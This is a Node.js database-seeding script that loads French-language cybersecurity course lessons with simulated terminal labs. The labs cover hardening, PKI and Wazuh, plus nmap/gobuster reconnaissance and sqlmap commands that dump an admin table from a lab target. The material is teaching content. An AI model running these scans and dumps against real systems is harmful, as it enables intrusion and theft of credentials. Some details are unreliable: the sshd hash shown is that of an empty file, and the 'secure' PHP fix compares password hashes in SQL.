require('dotenv').config()
const { PrismaClient } = require('@prisma/client')
const prisma = new PrismaClient()

async function main() {
    console.log('🚀 Enrichissement des cours de Cybersécurité avec les CyberTerminaux interactifs...')

    // =========================================================================
    // FORMATION 1 : Defensive Security & SOC
    // =========================================================================
    const slug1 = 'cybersecurite-protection-systemes-defensive'
    const course1 = await prisma.course.findUnique({ where: { slug: slug1 } })

    if (course1) {
        console.log(`\n📦 Mise à jour de la formation 1 : "${course1.title}"...`)

        // Leçon 1 : CIA & SSH Verification
        await prisma.lesson.updateMany({
            where: { courseId: course1.id, order: 1 },
            data: {
                content: `# Leçon 1 : Fondations de la Cybersécurité, Triade CIA & Cadres Règlementaires

## 1. La Triade CIA (Confidentialité, Intégrité, Disponibilité)

Tout système d'information sécurisé s'appuie sur trois piliers fondamentaux :
- **Confidentialité** : S'assurer que les données ne sont accessibles qu'aux utilisateurs autorisés (Chiffrement AES-256, gestion stricte des clés).
- **Intégrité** : Garantir que les données et configurations n'ont pas été altérées ou corrompues par un tiers non autorisé (Hashes SHA-256, signatures numériques).
- **Disponibilité** : Garantir l'accès continu aux services et données pour les utilisateurs légitimes (Haute disponibilité, Load balancing, protection Anti-DDoS, sauvegardes 3-2-1).

---

## 2. Cadres de Référence et Normes Internationales

- **ISO/IEC 27001** : Norme internationale décrivant la mise en place d'un Système de Management de la Sécurité de l'Information (SMSI).
- **NIST Cybersecurity Framework (CSF)** : Organisé en 5 fonctions clés : *Identify, Protect, Detect, Respond, Recover*.
- **Directive Européenne NIS2** : Obligations renforcées de cybersécurité pour les infrastructures critiques et opérateurs d'importance vitale.

---

## 🖥️ Labo Interactif : Vérification d'Intégrité de Fichiers sous Linux

Testez les commandes ci-dessous dans le terminal interactif pour vérifier l'empreinte numérique (Hash SHA-256) d'un binaire système et détecter d'éventuelles altérations malveillantes :

\`\`\`cyberterminal
{
  "title": "Labo 1.1 — Vérification de l'Intégrité d'un Binaire Système (SHA-256)",
  "os": "linux",
  "steps": [
    {
      "command": "sha256sum /usr/bin/sshd",
      "output": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855  /usr/bin/sshd",
      "explanation": "Calcul du hash SHA-256 actuel du démon SSH pour comparaison avec l'empreinte de référence."
    },
    {
      "command": "ls -l /usr/bin/sshd",
      "output": "-rwxr-xr-x 1 root root 882048 Jul 15 14:22 /usr/bin/sshd",
      "explanation": "Inspection des permissions système et du propriétaire du fichier (root:root)."
    },
    {
      "command": "uptime",
      "output": " 21:45:12 up 42 days, 12:04, 2 users, load average: 0.12, 0.08, 0.05",
      "explanation": "Vérification de la disponibilité du serveur (uptime et charge système)."
    }
  ]
}
\`\`\`

---

## 3. Modélisation des Menaces & Matrice MITRE ATT&CK

La matrice **MITRE ATT&CK** est la base de connaissances mondiale répertoriant les tactiques, techniques et procédures (TTPs) employées par les pirates informatiques.`
            }
        })

        // Leçon 2 : Hardening Linux & SSH / UFW / Fail2ban
        await prisma.lesson.updateMany({
            where: { courseId: course1.id, order: 2 },
            data: {
                content: `# Leçon 2 : Hardening Linux & Sécurisation Avancée des Serveurs

## 1. Sécurisation du service SSH (/etc/ssh/sshd_config)

Le service SSH est la cible numéro 1 des attaques par force brute. Voici les commandes essentielles pour sécuriser votre serveur Linux de production.

---

## 🖥️ Labo Interactif : Configuration SSH & Pare-feu UFW

Exécutez ce scénario guidé pas à pas dans le terminal pour apprendre à modifier le port SSH, activer le pare-feu UFW et protéger le serveur avec Fail2ban :

\`\`\`cyberterminal
{
  "title": "Labo 2.1 — Hardening SSH & Déploiement UFW / Fail2ban",
  "os": "linux",
  "steps": [
    {
      "command": "sudo nano /etc/ssh/sshd_config.d/security.conf",
      "output": "✅ Fichier /etc/ssh/sshd_config.d/security.conf créé avec succès.\nPort 2222\nPermitRootLogin no\nPasswordAuthentication no\nMaxAuthTries 3",
      "explanation": "Création du fichier de configuration restreint pour SSH (Port 2222, pas de connexion root direct, clés SSH uniquement)."
    },
    {
      "command": "sudo systemctl restart sshd",
      "output": "● sshd.service - OpenBSD Secure Shell server\n   Loaded: loaded (/lib/systemd/system/sshd.service; enabled)\n   Active: active (running) since Sun 2026-07-26 21:46:10 UTC",
      "explanation": "Redémarrage du service SSH pour appliquer les nouvelles règles de sécurité."
    },
    {
      "command": "sudo ufw default deny incoming && sudo ufw default allow outgoing",
      "output": "Default incoming policy changed to 'deny'\nDefault outgoing policy changed to 'allow'",
      "explanation": "Configuration de la politique par défaut d'UFW : Bloquer tout le trafic entrant, autoriser le trafic sortant."
    },
    {
      "command": "sudo ufw allow 2222/tcp && sudo ufw allow 80,443/tcp && sudo ufw enable",
      "output": "Rule added\nRule added (v6)\nCommand may disrupt existing ssh connections. Proceed with operation (y|n)? y\nFirewall is active and enabled on system startup",
      "explanation": "Ouverture sélective du port SSH sécurisé (2222) et des ports web (80, 443), puis activation du pare-feu."
    },
    {
      "command": "sudo fail2ban-client status sshd",
      "output": "Status for the jail: sshd\n|- Filter\n|  |- Currently failed: 0\n|  |- Total failed: 14\n|- Actions\n   |- Currently banned: 2\n   |- Banned IP list: 185.220.101.4 45.142.214.12",
      "explanation": "Inspection de l'état de Fail2ban : 2 adresses IP malveillantes ont été automatiquement bannies !"
    }
  ]
}
\`\`\`

---

## 2. Restriction des Droits & Auditd

Le daemon \`auditd\` surveille en temps réel toute modification suspecte dans les fichiers sensibles (\`/etc/passwd\`, \`/etc/shadow\`, \`/etc/sudoers\`).`
            }
        })

        // Leçon 3 : OpenSSL & PKI (Windows PowerShell Lab)
        await prisma.lesson.updateMany({
            where: { courseId: course1.id, order: 3 },
            data: {
                content: `# Leçon 3 : Cryptographie Appliquée, PKI & Sécurité des Communications

## 1. Chiffrement Symétrique vs Asymétrique

- **Chiffrement Symétrique (AES-GCM / ChaCha20)** : Une seule clé partagée sert à chiffrer et déchiffrer. Idéal pour le transfert rapide de gros volumes de données.
- **Chiffrement Asymétrique (RSA-4096 / ECC Ed25519)** : Une paire de clés (Clé Publique pour chiffrer / Clé Privée pour déchiffrer). Utilisé pour l'échange de clés et les signatures numériques.

---

## 🖥️ Labo Interactif : Génération de Certificat SSL/TLS avec OpenSSL (Windows PowerShell)

Découvrez comment générer une Autorité de Certification (Root CA) et un certificat SSL/TLS valide pour sécuriser votre domaine en environnement Windows/Linux :

\`\`\`cyberterminal
{
  "title": "Labo 3.1 — Génération d'une PKI & Certificat SSL/TLS OpenSSL",
  "os": "powershell",
  "steps": [
    {
      "command": "openssl genrsa -out rootCA.key 4096",
      "output": "Generating RSA private key, 4096 bit long modulus (2 primes)\n....................................................................+++++\ne is 65537 (0x10001)\n✅ Clé privée Root CA générée dans rootCA.key",
      "explanation": "Génération de la clé privée de l'Autorité de Certification racine (4096 bits)."
    },
    {
      "command": "openssl req -x509 -new -nodes -key rootCA.key -sha256 -days 3650 -out rootCA.crt -subj '/C=DZ/ST=Alger/L=Alger/O=ElSayf Security/CN=ElSayf Root CA'",
      "output": "✅ Certificat Racine Auto-signé généré avec succès (Valide jusqu'en 2036)",
      "explanation": "Création du certificat racine public X.509 d'une durée de validité de 10 ans."
    },
    {
      "command": "openssl genrsa -out server.key 2048",
      "output": "Generating RSA private key, 2048 bit long modulus\n✅ Clé serveur générée dans server.key",
      "explanation": "Création de la clé privée du serveur web HTTPS."
    },
    {
      "command": "openssl req -new -key server.key -out server.csr -subj '/C=DZ/ST=Alger/L=Alger/O=ElSayf Enterprise/CN=secure.elsayf.click'",
      "output": "✅ Demande de signature de certificat (CSR) créée pour secure.elsayf.click",
      "explanation": "Création de la demande de certificat (CSR) destinée à l'Autorité de Certification."
    },
    {
      "command": "openssl x509 -req -in server.csr -CA rootCA.crt -CAkey rootCA.key -CAcreateserial -out server.crt -days 825 -sha256",
      "output": "Signature ok\nsubject=C = DZ, ST = Alger, L = Alger, O = ElSayf Enterprise, CN = secure.elsayf.click\nGetting CA Private Key\n✅ Certificat SSL/TLS server.crt signé avec succès !",
      "explanation": "Signature officielle du certificat HTTPS du serveur par la Root CA."
    }
  ]
}
\`\`\`

---

## 2. Tunneling Sécurisé WireGuard VPN

WireGuard offre des performances supérieures à OpenVPN grâce à l'utilisation d'algorithmes modernes (Curve25519, ChaCha20-Poly1305).`
            }
        })

        // Leçon 5 : SIEM Wazuh & Logs
        await prisma.lesson.updateMany({
            where: { courseId: course1.id, order: 5 },
            data: {
                content: `# Leçon 5 : Monitoring de Sécurité, Analyse de Logs & Déploiement d'un SIEM (Wazuh)

## 1. Qu'est-ce qu'un SIEM (Security Information and Event Management) ?

Un SIEM est le cœur du **SOC (Security Operations Center)**. Il centralise, normalise, corrèle et analyse des millions d'événements par jour provenant des serveurs, pare-feux, bases de données et postes de travail.

---

## 🖥️ Labo Interactif : Déploiement & Inspection d'un Agent SIEM Wazuh

Suivez l'installation de l'agent de sécurité Wazuh sur un nœud Linux et l'analyse de logs en direct :

\`\`\`cyberterminal
{
  "title": "Labo 5.1 — Déploiement Agent Wazuh & Surveillance SIEM",
  "os": "linux",
  "steps": [
    {
      "command": "curl -s https://packages.wazuh.com/key/GPG-KEY-WAZUH | sudo gpg --no-default-keyring --keyring gnupg-ring:/usr/share/keyrings/wazuh.gpg --import",
      "output": "gpg: key 96B3EE5F29111145: public key 'Wazuh Corporate <info@wazuh.com>' imported",
      "explanation": "Importation de la clé GPG officielle pour vérifier l'authenticité des paquets Wazuh."
    },
    {
      "command": "WAZUH_MANAGER='siem.elsayf.click' WAZUH_AGENT_NAME='srv-web-prod' sudo apt-get install wazuh-agent -y",
      "output": "Reading package lists... Done\nBuilding dependency tree... Done\nProcessing triggers for systemd...\n✅ Wazuh Agent 4.7.0 installé et configuré vers siem.elsayf.click",
      "explanation": "Installation de l'agent Wazuh connecté au Manager central SIEM de l'entreprise."
    },
    {
      "command": "sudo systemctl daemon-reload && sudo systemctl enable wazuh-agent && sudo systemctl start wazuh-agent",
      "output": "Created symlink /etc/systemd/system/multi-user.target.wants/wazuh-agent.service\n● wazuh-agent.service - Wazuh agent\n   Active: active (running)",
      "explanation": "Activation au démarrage et lancement du service d'agent de sécurité."
    },
    {
      "command": "sudo tail -f /var/ossec/logs/active-responses.log",
      "output": "Sun Jul 26 21:48:02 UTC 2026 /var/ossec/active-response/bin/host-deny.sh add - 198.51.100.42 1722030482.10234 31151\n✅ ALERTE SOC : Blocage actif déclenché contre l'IP 198.51.100.42 (Tentative d'intrusion)",
      "explanation": "Lecture des journaux de réponse active : le SIEM a bloqué automatiquement un attaquant en temps réel !"
    }
  ]
}
\`\`\`

---

## 2. Déploiement Rapide du SIEM Wazuh avec Docker Compose

\`\`\`yaml
# docker-compose.yml - Stack Wazuh SIEM
version: '3.8'
services:
  wazuh.manager:
    image: wazuh/wazuh-manager:4.7.0
    restart: always
    ports:
      - "1514:1514/udp"
      - "55000:55000/tcp"
\`\`\``
            }
        })

        console.log('✅ Formation 1 mise à jour avec succès avec les CyberTerminaux !')
    }

    // =========================================================================
    // FORMATION 2 : Ethical Hacking & Pentest Web
    // =========================================================================
    const slug2 = 'ethical-hacking-securite-web-pentest'
    const course2 = await prisma.course.findUnique({ where: { slug: slug2 } })

    if (course2) {
        console.log(`\n📦 Mise à jour de la formation 2 : "${course2.title}"...`)

        // Leçon 2 : Nmap & Reconnaissance (Windows CMD Lab)
        await prisma.lesson.updateMany({
            where: { courseId: course2.id, order: 2 },
            data: {
                content: `# Leçon 2 : Reconnaissance, Cartographie & Scanner de Réseau (Nmap, OSINT)

## 1. Reconnaissance Passive (OSINT)

La reconnaissance passive consiste à collecter des informations stratégiques sans envoyer de paquets directement détectables sur le serveur de la cible :
- Recherche de sous-domaines (\`sublist3r\`, \`amass\`).
- Analyse des enregistrements DNS (DNSENUM, WHOIS).
- Détection des technologies web utilisées (Wappalyzer).

---

## 🖥️ Labo Interactif : Scan de Réseau & Fuzzing avec Nmap & Gobuster (CMD Windows)

Simulez une phase d'audit de sécurité réseau complète pour cartographier les ports ouverts et les répertoires cachés de la cible :

\`\`\`cyberterminal
{
  "title": "Labo 2.1 — Cartographie Réseau avec Nmap & Gobuster",
  "os": "windows",
  "steps": [
    {
      "command": "nmap -sS -p 22,80,443,3306 192.168.1.50",
      "output": "Starting Nmap 7.94 ( https://nmap.org )\nNmap scan report for target.elsayf.local (192.168.1.50)\nHost is up (0.0012s latency).\nPORT     STATE SERVICE\n22/tcp   open  ssh\n80/tcp   open  http\n443/tcp  open  https\n3306/tcp open  mysql\n\nNmap done: 1 IP address (1 host up) scanned in 0.45 seconds",
      "explanation": "Scan SYN rapide des ports stratégiques (SSH, HTTP, HTTPS, MySQL)."
    },
    {
      "command": "nmap -sV --version-intensity 5 -p 80 192.168.1.50",
      "output": "PORT   STATE SERVICE VERSION\n80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel",
      "explanation": "Détection précise de la version du serveur Web (Apache 2.4.52 sous Ubuntu)."
    },
    {
      "command": "gobuster dir -u http://192.168.1.50/ -w common.txt -x php,html",
      "output": "===================================================\nGobuster v3.6 - Directory Fuzzing\n===================================================\n[+] Url:                     http://192.168.1.50/\n[+] Method:                  GET\n===================================================\n/admin                (Status: 301) [Size: 315] [--> http://192.168.1.50/admin/]\n/config.php           (Status: 200) [Size: 0]\n/db_backup.sql        (Status: 200) [Size: 145200]\n/images               (Status: 301) [Size: 316]\n===================================================\nFinished",
      "explanation": "Fuzzing de répertoires web : Découverte critique d'un fichier de dump SQL (/db_backup.sql) accessible sans authentification !"
    }
  ]
}
\`\`\`

---

## 2. Scans Actifs Avancés avec Nmap

- **Scan SYN (\`-sS\`)** : Discret, n'établit pas la poignée de main TCP complète.
- **Scan d'OS & Services (\`-sV -O\`)** : Identifie les versions exactes pour cibler les CVEs répertoriées.`
            }
        })

        // Leçon 3 : SQL Injection (PowerShell Lab)
        await prisma.lesson.updateMany({
            where: { courseId: course2.id, order: 3 },
            data: {
                content: `# Leçon 3 : OWASP Top 10 (Partie 1) - SQL Injections (SQLi) & Bypass d'Auth

## 1. Comprendre la Vulnérabilité SQL Injection

L'injection SQL survient lorsque des données saisies par un utilisateur sont directement concaténées dans une requête SQL sans être nettoyées ni préparées.

---

## 🖥️ Labo Interactif : Exploitation SQLi & Dump de Base avec SQLMap

Découvrez comment utiliser l'outil automatisé SQLMap pour auditer une application web et extraire la base de données :

\`\`\`cyberterminal
{
  "title": "Labo 3.1 — Détection & Exploitation d'une Injection SQL (SQLMap)",
  "os": "powershell",
  "steps": [
    {
      "command": "python sqlmap.py -u 'http://target.elsayf.local/search.php?id=1' --batch --dbs",
      "output": "[+] Testing connection to the target URL...\n[+] GET parameter 'id' is vulnerable. Do you want to keep testing others? [Y/n] Y\nsqlmap identified the following injection point:\nParameter: id (GET)\n    Type: boolean-based blind / UNION query\n    Title: Generic UNION query (NULL) - 3 columns\navailable databases [3]:\n[*] information_schema\n[*] mysql\n[*] elsayf_db",
      "explanation": "Identification réussie de la faille SQLi et énumération des bases de données du serveur."
    },
    {
      "command": "python sqlmap.py -u 'http://target.elsayf.local/search.php?id=1' -D elsayf_db --tables",
      "output": "Database: elsayf_db\n[4 tables]\n+----------------+\n| admin_users    |\n| orders         |\n| payment_keys   |\n| products       |\n+----------------+",
      "explanation": "Extraction de la liste des tables de la base 'elsayf_db'."
    },
    {
      "command": "python sqlmap.py -u 'http://target.elsayf.local/search.php?id=1' -D elsayf_db -T admin_users --dump",
      "output": "Database: elsayf_db\nTable: admin_users\n[2 entries]\n+----+-------------------+----------------------------------+\n| id | email             | password_hash                    |\n+----+-------------------+----------------------------------+\n| 1  | admin@elsayf.click| $2b$12$e8ZbJ2... (bcrypt hash)   |\n| 2  | super@statlabo.com| $2b$12$k9LpW1... (bcrypt hash)   |\n+----+-------------------+----------------------------------+\n✅ Extraction terminée avec succès !",
      "explanation": "Dump sécurisé des comptes d'administration et hashes de mots de passe à analyser."
    }
  ]
}
\`\`\`

---

## 2. Correctif Securisé : Requêtes Préparées (PDO / ORM)

\`\`\`php
// Code Securisé (PHP PDO) :
$stmt = $pdo->prepare('SELECT * FROM users WHERE email = :email AND password = :pass');
$stmt->execute(['email' => $email, 'pass' => $hashedPassword]);
$user = $stmt->fetch();
\`\`\``
            }
        })

        console.log('✅ Formation 2 mise à jour avec succès avec les CyberTerminaux !')
    }

    console.log('\n🎉 Tous les CyberTerminaux interactifs ont été intégrés avec succès dans la base de données !')
}

main()
    .catch(e => {
        console.error('❌ Erreur :', e)
        process.exit(1)
    })
    .finally(async () => {
        await prisma.$disconnect()
    })
